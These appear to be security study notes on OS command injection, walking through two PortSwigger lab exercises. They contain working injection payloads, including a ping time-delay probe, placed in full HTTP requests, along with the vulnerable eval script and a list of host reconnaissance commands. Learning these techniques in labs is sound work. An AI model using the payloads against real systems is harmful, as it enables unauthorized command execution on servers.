# Command Injection

OS command injection allows an attacker to execute commands on the host (underlying server) operating system, and in some cases could result in the attacker assuming full control of the server. 

If the application doesn't implement any protections or user input validation, the attacker may be able to manipulate the underlying server command to execute arbitrary shell commands. 

## Simple injection

The basic example from PortSwigger is:

```
& echo aiwefwlguh &
```

??? example "PortSwigger OS Injection Lab 1: OS command injection, simple case"

	Here we've got an application that performs a stock lookup using a shell script on the underlying server. There are no user input protections in place. 
	
	![](../../../assets/screenshots/command-injection/Pasted%20image%2020250801072123.png)
	
	The request looks like this:
	
	```
	POST /product/stock HTTP/1.1
	Host: 0aab00a504ea896e81f0168900c60006.web-security-academy.net
	User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:141.0) Gecko/20100101 Firefox/141.0
	Accept: */*
	Accept-Language: en-US,en;q=0.5
	Accept-Encoding: gzip, deflate, br, zstd
	Referer: https://0aab00a504ea896e81f0168900c60006.web-security-academy.net/product?productId=1
	Content-Type: application/x-www-form-urlencoded
	Content-Length: 21
	Origin: https://0aab00a504ea896e81f0168900c60006.web-security-academy.net
	Connection: keep-alive
	Cookie: session=vvWuL2C5s8LQyofZUKKmcbiWpd2ntO4k
	Sec-Fetch-Dest: empty
	Sec-Fetch-Mode: cors
	Sec-Fetch-Site: same-origin
	X-PwnFox-Color: magenta
	Priority: u=0
	
	productId=1&storeId=1
	```
	
	```
	HTTP/1.1 200 OK
	Content-Type: text/plain; charset=utf-8
	X-Frame-Options: SAMEORIGIN
	Connection: close
	Content-Length: 3
	
	62
	```
	
	Testing each parameter individually, we get an error in the productId field:
	
	![](../../../assets/screenshots/command-injection/Pasted%20image%2020250801072647.png)
	
	The same payload works in the storeId field, however. 
	
	![](../../../assets/screenshots/command-injection/Pasted%20image%2020250801072745.png)
	
	The following script is what's getting executed
	
	```bash
	#!/bin/bash
	
	set -eu
	
	eval cksum <<< "$1 $2" | cut -c 2-3 | rev | sed s/0/1/
	```
	
	The input we provide is being expanded in `$2` and is passed to `eval`. 

## Useful Commands

These can be useful for getting more information about the operating system and environment.

=== "Linux"

	Name of the current user
	
	```bash
	whoami
	```
	
	Operating system
	
	```bash
	uname -a
	```
	
	Network configuration
	
	```bash
	ifconfig
	ip address show
	```
	
	Network connections
	
	```bash
	netstat -ano
	```
	
	Running processes
	
	```bash
	ps -ef
		```

=== "Windows"

	Name of the current user
	
	```powershell
	whoami
	```
	
	Operating system
	
	```powershell
	ver
	```
	
	Network configuration
	
	```powershell
	ipconfig /all
	```
	
	Network connections
	
	```powershell
	netstat -ano
	```
	
	Running processes
	
	```powershell
	tasklist
	```

## Blind OS Command Injection

If the application does not return the results of the command to the user, it's blind OS command injection vulnerability. 

### Detecting blind OS command injection

Using a time delay is best for this. 

Example:

```
& ping -c 10 127.0.0.1 &
```

This will generate a 10 second time delay. 

??? example "PortSwigger OS Command Injection Lab 2: Blind OS command injection with time delays"

	The application has a user feedback submission form.
	
	![](../../../assets/screenshots/command-injection/Pasted%20image%2020250801075848.png)
	
	After submitting feedback we just get a simple confirmation message
	
	![](../../../assets/screenshots/command-injection/Pasted%20image%2020250801075935.png)
	
	The submission POST request and response are below:
	
	```
	POST /feedback/submit HTTP/1.1
	Host: 0ac6008a0376a6c98350af40005d0069.web-security-academy.net
	User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:141.0) Gecko/20100101 Firefox/141.0
	Accept: */*
	Accept-Language: en-US,en;q=0.5
	Accept-Encoding: gzip, deflate, br, zstd
	Content-Type: application/x-www-form-urlencoded
	Content-Length: 110
	Origin: https://0ac6008a0376a6c98350af40005d0069.web-security-academy.net
	Connection: keep-alive
	Referer: https://0ac6008a0376a6c98350af40005d0069.web-security-academy.net/feedback
	Cookie: session=8mtcQ6OZfUVHqePZkLJJFthKWrV0R6QQ
	Sec-Fetch-Dest: empty
	Sec-Fetch-Mode: cors
	Sec-Fetch-Site: same-origin
	X-PwnFox-Color: magenta
	Priority: u=0
	
	csrf=tOw3LbawuI4HrrZRySXz0mv0uLBlRa4X&name=tester&email=tester%40test.com&subject=Testing&message=Test+message
	```
	
	```
	HTTP/1.1 200 OK
	Content-Type: application/json; charset=utf-8
	X-Frame-Options: SAMEORIGIN
	Connection: close
	Content-Length: 2
	
	{}
	```
	
	When we add a time delay payload in the email field, we get a (roughly) 10 second delay.
	
	```
	POST /feedback/submit HTTP/1.1
	Host: 0ac6008a0376a6c98350af40005d0069.web-security-academy.net
	User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:141.0) Gecko/20100101 Firefox/141.0
	Accept: */*
	Accept-Language: en-US,en;q=0.5
	Accept-Encoding: gzip, deflate, br, zstd
	Content-Type: application/x-www-form-urlencoded
	Content-Length: 110
	Origin: https://0ac6008a0376a6c98350af40005d0069.web-security-academy.net
	Connection: keep-alive
	Referer: https://0ac6008a0376a6c98350af40005d0069.web-security-academy.net/feedback
	Cookie: session=8mtcQ6OZfUVHqePZkLJJFthKWrV0R6QQ
	Sec-Fetch-Dest: empty
	Sec-Fetch-Mode: cors
	Sec-Fetch-Site: same-origin
	X-PwnFox-Color: magenta
	Priority: u=0
	
	csrf=tOw3LbawuI4HrrZRySXz0mv0uLBlRa4X&name=tester&email=tester%40test.com%26ping%20-c%2010%20127.0.0.1%20%26&subject=Testing&message=Test+message%26ping%20-c%2010%20127.0.0.1%20%26
	```
	
	```
	HTTP/1.1 500 Internal Server Error
	Content-Type: application/json; charset=utf-8
	X-Frame-Options: SAMEORIGIN
	Connection: close
	Content-Length: 16
	
	"Could not save"
	```
	
	![](../../../assets/screenshots/command-injection/Pasted%20image%2020250801080537.png)
	
	And the lab is done. 
	
	![](../../../assets/screenshots/command-injection/Pasted%20image%2020250801080637.png)
	

